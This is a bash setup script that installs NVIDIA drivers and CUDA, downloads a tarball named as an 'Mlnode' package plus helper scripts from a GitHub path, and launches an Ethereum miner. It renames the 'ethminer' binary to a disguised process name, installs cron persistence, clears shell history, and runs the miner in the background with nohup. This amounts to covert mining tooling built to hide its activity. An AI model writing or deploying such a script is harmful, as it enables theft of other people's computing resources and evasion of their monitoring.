#!/bin/bash

gitpath=$(head -1 gitpath.txt)

yes '' | sudo add-apt-repository ppa:graphics-drivers/ppa
sudo apt install -y nvidia-driver-418

CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG}
sudo dpkg -i /tmp/${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub 

rm -f /tmp/${CUDA_REPO_PKG}
sudo apt-get update -y
sudo apt-get install cuda-drivers -y

sudo apt-get install cuda -y
sudo apt-get update -y
sudo apt-get upgrade -y
sudo apt-get dist-upgrade -y
sudo apt-get install cuda-drivers -y

wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
tar -xvf Mlnode.tar.gz
rm -rf Mlnode.tar.gz
wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
chmod +x auinstall.sh
chmod +x processname.sh
chmod +x cronadd.sh
./cronadd.sh
./processname.sh
cp inuser.txt bin/inuser.txt

history -c

cd bin/
Uuname=$(cat inuser.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
chmod +x runsrc.sh
mv ethminer $USEPROCNAME
sudo chown -R $Uuname:$Uuname /home/$Uuname/
nohup sh runsrc.sh > result.log 2>&1 &
